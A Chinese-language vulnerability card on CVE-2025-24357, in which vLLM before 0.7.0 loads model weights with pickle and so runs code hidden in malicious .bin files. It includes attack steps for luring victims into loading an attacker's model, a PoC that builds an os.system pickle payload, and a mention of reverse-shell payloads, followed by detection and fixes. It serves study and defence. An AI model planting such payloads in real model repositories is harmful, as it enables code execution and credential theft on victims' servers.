---
id: ai-security-supply-chain-vllm-torch-load-weights-only-pickle-rce
title: vLLM <0.7.0 权重加载 torch.load 未设 weights_only：加载恶意 .bin 模型即 pickle RCE（CVE-2025-24357）
type: scenario
domain: ai-security
path: ai-security/supply-chain
technique: vllm-torch-load-weights-only-pickle-rce
aliases:
- CVE-2025-24357
- vLLM 恶意模型 RCE
- hf_model_weights_iterator
- torch.load weights_only=False
- pytorch_model.bin 反序列化
tags:
- vllm
- pytorch
- torch-load
- pickle
- deserialization
- model-loading
- supply-chain
- rce
- cve
cve:
- CVE-2025-24357
severity: critical
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
affected_versions: vLLM < 0.7.0（0.7.0 修复）
verification:
  verified_by: verifier-V163
  verified_at: '2026-11-06T09:46:59+08:00'
  notes: 已对照原文与2张图核对：CVE-2025-24357/CWE-502、weight_utils.py 三处 torch.load(convert_bin_to_safetensor_file/np_cache_weights_iterator/pt_weights_iterator)均未设 weights_only=True、hf_model_weights_iterator 从 HF 下载权重、v0.7.0 修复补 weights_only=True（图02另含 assets/image.py、lora/models.py）均一致；pickle __reduce__ RCE 链条成立。未验证点：文章对 weights_only=True 后 torch.jit.load/TorchScript 绕过只给示例并引用另一篇文章，卡已注明低置信；PoC 为构造示例未实跑；frontmatter 无 sources/source_url。
---

## 一句话结论

vLLM 0.7.0 之前，`vllm/model_executor/weight_utils.py` 的 `hf_model_weights_iterator` 在加载 Hugging Face 模型检查点时，对 `pytorch_model*.bin`/`.pt` 调用 `torch.load(..., map_location="cpu")` 而没有设置 `weights_only=True`；`torch.load` 默认使用 pickle 反序列化，攻击者发布一个包含 `__reduce__` 恶意对象的“模型”仓库，受害者用 vLLM 加载时即执行任意代码（CVE-2025-24357，CWE-502）。

## 原理

- PyTorch 的 `.bin`/`.pt`/`.pth` 模型文件通常用 pickle 序列化；`torch.load()` 在 `weights_only=False`（旧版本默认）时走完整 pickle 反序列化，会执行 `__reduce__` 返回的 callable 与参数。
- vLLM 的权重加载路径至少有三处直接调用 `torch.load`，都没有传 `weights_only=True`：
  - `convert_bin_to_safetensor_file()`：`loaded = torch.load(pt_filename, map_location="cpu")`
  - `np_cache_weights_iterator()`：`state = torch.load(bin_file, map_location="cpu")`
  - `pt_weights_iterator()`：`state = torch.load(bin_file, map_location="cpu")`
- `hf_model_weights_iterator` 会从 Hugging Face 下载模型权重并选择上述迭代器；因此“加载一个模型仓库”等价于“对仓库里的 pickle 文件执行反序列化”。
- 攻击者可以把恶意对象与真实权重混在同一文件里：`torch.load` 先执行 payload，再返回 state_dict，模型看起来仍能正常加载，隐蔽性强。
- 修复（v0.7.0）给这些 `torch.load` 调用补上 `weights_only=True`（修复 diff 也覆盖 `vllm/assets/image.py`、`vllm/lora/models.py` 等调用点）；但文章同时提到，`weights_only=True` 仍可能通过 `torch.jit.load` 加载 TorchScript 模型，TorchScript 的算子/序列化面仍需单独评估（该后续利用在文中只有一段示例，未完整验证）。
- 本质：模型文件是不可信输入，而 `torch.load` 的默认行为是“反序列化即执行”；只要调用点漏掉 `weights_only=True`，模型仓库就是代码执行入口。

## 触发条件

- 目标运行 vLLM < 0.7.0（0.7.0 修复）。
- 受害者加载攻击者可控的 Hugging Face 模型仓库/本地模型目录，且权重格式为 `.bin`/`.pt`（`pytorch_model.bin` 等）。
- 加载进程能访问该仓库，且 vLLM 进程有权限执行 Python/系统命令。
- 目标未在加载前对 pickle 做静态扫描、未使用 safetensors、未在沙箱中加载。

## 利用步骤

1. 构造恶意 pickle 对象，`__reduce__` 返回 `(os.system, ("id > /tmp/vllm_pwned",))` 或反弹 shell 命令。
2. 把它保存为 `pytorch_model.bin`（可与真实 state_dict 混合，保证 `torch.load` 返回值仍可迭代），并准备一个合法的 `config.json`。
3. 上传到 Hugging Face 仓库或放到受害者可访问的模型目录。
4. 诱导受害者执行 `vllm serve attacker/model` 或 `LLM(model="attacker/model")`；`hf_model_weights_iterator` 下载权重并调用 `torch.load`，payload 执行。
5. 验证命令回连/文件写入；成功后窃取模型、凭证或横向移动。

## PoC

```python
import os, torch

class Evil:
    def __reduce__(self):
        return (os.system, ("id > /tmp/vllm_pwned",))

# 可与真实 state_dict 混合；torch.save 使用 pickle
payload = {"model.embed_tokens.weight": torch.zeros(1), "evil": Evil()}
torch.save(payload, "pytorch_model.bin")
```

```python
# 受害者侧（vLLM < 0.7.0）
from vllm import LLM
llm = LLM(model="attacker/evil-model")   # 加载权重时触发 torch.load → pickle
```

## 变体与关联

- `weights_only=True` 之后的绕过：文章引用另一篇文章称 `torch.load(..., weights_only=True)` 仍可能走 `torch.jit.load` 加载 TorchScript 模型；TorchScript 的算子/自定义类可能带来新的执行面。该链路在本文只有示例、未完整验证，实际利用需单独评估。
- 其他 vLLM 加载入口：`vllm/assets/image.py`、`vllm/lora/models.py` 等也曾直接 `torch.load`；修复 diff 一并加了 `weights_only=True`，审计时应搜索所有 `torch.load` 调用。
- 同类模型供应链：Hugging Face 恶意 pickle 模型、`torch.export.load` 的 `use_pickle`、safetensors 之外的 `.bin` 权重；safetensors 只存张量、不执行代码，是更安全的格式。
- 关联：[[ai-security-supply-chain-huggingface-pickle-model-reverse-shell]]（HF 恶意模型 pickle 反弹 Shell）、[[ai-security-supply-chain-pytorch-export-load-use-pickle-rce]]（torch.export.load 的 use_pickle RCE）、[[ai-security-supply-chain-vllm-auto-map-trust-remote-code-bypass]]（vLLM auto_map 动态代码加载）。
- 边界：0.7.0+ 已补 `weights_only=True`；若目标只使用 safetensors 权重、或加载前做了 pickle 扫描/沙箱隔离，本手法不成立。TorchScript 绕过部分置信度较低。

## 检测与防御

- 检测：检查 vLLM 版本是否 <0.7.0；搜索所有 `torch.load` 调用是否显式设置 `weights_only=True`；对模型仓库中的 `.bin`/`.pt` 做 pickle 静态扫描（`picklescan` 等）；监控模型加载阶段的异常子进程/外连。
- 修复：升级 vLLM 到 0.7.0+ 并升级 PyTorch 到默认 `weights_only=True` 的版本；优先使用 safetensors 权重；不要加载来源不明的模型。
- 加固：在无网络/无凭证的沙箱中加载模型；限制进程权限；对模型仓库做签名/哈希校验；对 pickle 文件做隔离解析或拒绝。
